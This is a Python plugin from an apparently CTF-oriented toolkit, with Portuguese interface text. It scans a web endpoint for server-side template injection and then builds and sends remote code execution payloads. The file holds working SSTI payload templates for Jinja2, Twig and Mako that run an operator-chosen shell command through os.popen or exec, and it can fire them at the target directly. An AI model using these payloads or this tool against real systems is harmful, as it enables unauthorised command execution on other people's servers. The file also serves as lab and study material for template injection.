"""
plugins/ssti.py — plugin: Server-Side Template Injection scanner & exploit generator.
"""

from __future__ import annotations

from rich.console import Console

from ctflab.core import http as H
from ctflab.core.session import Session
from ctflab.cli.ui import ask, askctx, scan_table

PLUGIN_NAME = "SSTI Scanner"
PLUGIN_DESC = "Detecta SSTI e gera payloads de exploração genéricos"

# Probes matemáticos para detecção
_MATH_PROBES: dict[str, tuple[str, str]] = {
    "{{7*7}}":        ("49",      "Jinja2 / Twig"),
    "${7*7}":         ("49",      "Mako / Freemarker / EL"),
    "#{7*7}":         ("49",      "Thymeleaf / Ruby ERB"),
    "<%= 7*7 %>":     ("49",      "ERB / EJS"),
    "@(7*7)":         ("49",      "Razor (.NET)"),
    "{{7*'7'}}":      ("7777777", "Jinja2 (string mul)"),
}

# Biblioteca de templates de exploit (vazio cmd para ser preenchido)
# Note: Usamos {{ para representar { literal devido ao .format()
_EXPLOIT_TEMPLATES = {
    "Jinja2 (Bypass cycler)": "{{{{cycler.__init__.__globals__['os'].popen('{cmd}').read()}}}}",
    "Jinja2 (Standard)": "{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}",
    "Jinja2 (Bypass lipsum)": "{{{{lipsum.__init__.__globals__['os'].popen('{cmd}').read()}}}}",
    "Jinja2 (MRO subclasses)": "{{{{().__class__.__base__.__subclasses__()[166].__init__.__globals__['os'].popen('{cmd}').read()}}}}",
    "Twig": "{{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('{cmd}')}}}}",
    "Mako": "${{(__import__('os').popen('{cmd}').read())}}",
}


def run(session: Session, console: Console) -> None:
    console.rule("[head]SSTI SCANNER & EXPLOIT GENERATOR[/head]")
    console.print("[dim]Detecta SSTI e gera alavancas de RCE para múltiplos motores.[/dim]\n")

    path  = askctx(session, "path",  "path",       "/")
    param = askctx(session, "param", "parâmetro",  "template")
    mode  = ask("modo (json/get)", "json")

    table = scan_table("SSTI Detection", ["probe", "esperado", "encontrado?", "engine"])

    detected_engines = set()
    hits = 0

    with H.make_client(session) as cl:
        for probe, (expected, engine_hint) in _MATH_PROBES.items():
            try:
                if mode == "get":
                    r = cl.get(path, params={param: probe})
                else:
                    r = cl.post(path, json={param: probe})

                found = expected in r.text
                hit_str = "[ok]sim[/ok]" if found else "[fail]não[/fail]"
                
                if found:
                    hits += 1
                    detected_engines.add(engine_hint.split(" / ")[0])
                    session.note(f"SSTI detected: {probe} -> {engine_hint}")

                table.add_row(probe, expected, hit_str, engine_hint if found else "")
            except Exception as exc:
                table.add_row(probe, expected, f"[fail]ERR: {str(exc)[:20]}[/fail]", "")

    console.print(table)

    if not hits:
        console.print("\n[fail]Nenhuma vulnerabilidade detectada nos probes básicos.[/fail]")
        return

    console.print(f"\n[ok]Sucesso! {hits} probe(s) confirmaram a vulnerabilidade.[/ok]")
    
    if ask("Deseja abrir a Fábrica de Exploits?", "y").lower() != "y":
        return

    console.rule("[head]FÁBRICA DE EXPLOITS[/head]")
    cmd = ask("Comando para executar", "id")

    console.print("\n[info]Selecione o template de exploit:[/info]")
    options = list(_EXPLOIT_TEMPLATES.keys())
    for i, name in enumerate(options, 1):
        console.print(f"  [warn]{i}[/warn]. {name}")
    
    choice = ask("opção", "1")
    try:
        idx = int(choice) - 1
        template_name = options[idx]
        payload = _EXPLOIT_TEMPLATES[template_name].format(cmd=cmd)
        
        console.print(f"\n[info]Template: {template_name}[/info]")
        console.rule("[warn]PAYLOAD GERADO[/warn]")
        console.print(f"\n[flag] {payload} [/flag]\n")
        
        if ask("Deseja disparar o exploit agora?", "y").lower() == "y":
            target_param = ask("Nome do campo JSON para o payload", param)
            # Envia o payload encapsulado no JSON esperado pelo servidor
            r = H.post(session, path, {target_param: payload})
            from ctflab.cli.ui import show_response
            show_response(r, session.history[-1].elapsed, session)
        else:
            console.print("[dim]Copie e use no módulo de Reconhecimento ou manualmente.[/dim]")
    except (ValueError, IndexError):
        console.print("[fail]Opção inválida.[/fail]")
